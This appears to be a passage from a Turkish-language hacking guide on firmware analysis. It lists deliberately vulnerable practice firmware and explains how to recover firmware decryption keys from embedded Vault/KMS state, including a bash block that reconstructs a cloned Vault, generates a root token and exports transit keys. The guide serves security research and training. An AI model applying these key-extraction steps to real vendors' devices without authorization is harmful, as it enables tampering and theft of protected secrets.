Firmware'deki zafiyetleri keşfetme pratiği yapmak için başlangıç noktası olarak aşağıdaki savunmasız firmware projelerini kullanın.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state'ten firmware decryption key'lerini kurtarma

Bir update image'ı az miktarda plaintext metadata'yı büyük, yüksek entropili bir blob'la birleştiriyorsa herhangi bir brute-force işleminden önce container triage yapın:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` ve `binwalk -E` ile header'ları, offset'leri ve satır sınırlarını dökümleyin.
- `Salted__` genellikle OpenSSL `enc` formatına işaret eder: sonraki 8 byte salt, kalan byte'lar ise ciphertext'tir.
- Tam olarak `256` byte'a decode olan bir Base64 alanı, rastgele bir firmware password/session key'i sarmalayan bir RSA-2048 ciphertext'e baktığınıza dair güçlü bir ipucudur.
- Aynı dosyadaki detached PGP materyali genellikle yalnızca authenticity'yi korur; bunun confidentiality mekanizması olduğunu varsaymayın.

Statik key araması (`grep`, `strings`, PEM/PGP aramaları) başarısız olursa yalnızca private key aramak yerine **operational decrypt path**'i reverse edin:

- Updater / management binary'yi decompile edin ve şifreli blob'u kimin okuduğunu, hangi helper/API'nin unwrap işlemi yaptığını ve hangi mantıksal key adının istendiğini izleyin.
- KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) ile unit file'ları ve init script'leri için çıkarılmış root filesystem'i arayın.
- Plaintext `vault operator unseal ...` komutlarını, recovery key'lerini, bootstrap token'larını veya yerel KMS auto-unseal script'lerini private-key materyaliyle eşdeğer kabul edin.

Appliance orijinal Vault binary'sini ve storage backend'ini içeriyorsa bu ortamı yeniden oluşturmak genellikle Vault iç işleyişini baştan uygulamaktan daha kolaydır:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Klonlanmış KMS üzerinde root yetkisiyle:

- Transit key'leri yalnızca izole klon içinde export edilebilir hâle getirin: `vault write transit/keys/<name>/config exportable=true`
- Unwrap key'i export edin: `vault read transit/export/encryption-key/<name>`
- Kurtarılan RSA key'ini KMS'in kullandığı padding/hash çiftiyle deneyin. Başarısız bir PKCS#1 v1.5 decrypt işlemi ve varsayılan OAEP decrypt işleminin başarısız olması, key'in yanlış olduğunu **kanıtlamaz**; Vault destekli birçok akış SHA-256 ile OAEP kullanırken yaygın kütüphaneler varsayılan olarak SHA-1 kullanır.
- Payload `Salted__` ile başlıyorsa AES-CBC decrypt işlemine geçmeden önce satıcının OpenSSL KDF'sini (`EVP_BytesToKey`, eski cihazlarda genellikle MD5) birebir uygulayın.

Böylece "encrypted firmware" daha genel bir probleme dönüşür: **cihaz tarafındaki operasyonel key'leri kurtarın, ardından unwrap + KDF parametrelerini çevrimdışı ortamda birebir uygulayın**.

## Eğitim ve Sertifikalar

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude ile Firmware Kırma: Kıdemli Seviyede Beceri, Başlangıç Seviyesinde Özerklik](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Güvenliği Test Metodolojisi](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Pratik IoT Hacking: Nesnelerin İnterneti'ne Saldırmak İçin Kapsamlı Kılavuz](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Terk Edilmiş Donanımlarda Zero-Day Açıklarından Yararlanma – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 Dolarlık Akıllı Bir Cihaz Evime Erişim Sağladı](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Şimdi mi Görüyorsun: Şimdi Pwned'sın](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector'dan şarj portu konnektörü üzerinden yararlanma - Bölüm 2: anti-downgrade mekanizmasını atlatma](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Yanıp Sönmesini Sağlayın: Philips Hue Bridge'in Over-the-Air Açığından Yararlanma](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
